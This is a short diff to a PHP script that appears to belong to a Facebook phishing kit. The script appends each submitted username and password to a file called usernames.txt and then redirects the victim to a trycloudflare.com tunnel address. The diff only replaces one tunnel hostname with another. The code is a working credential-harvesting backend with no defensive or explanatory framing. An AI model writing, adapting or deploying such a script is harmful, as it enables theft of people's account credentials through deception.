@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://jimmy-playing-den-laws.trycloudflare.com');
+header('Location: https://gorgeous-ed-clark-queue.trycloudflare.com');
 exit();
 ?>
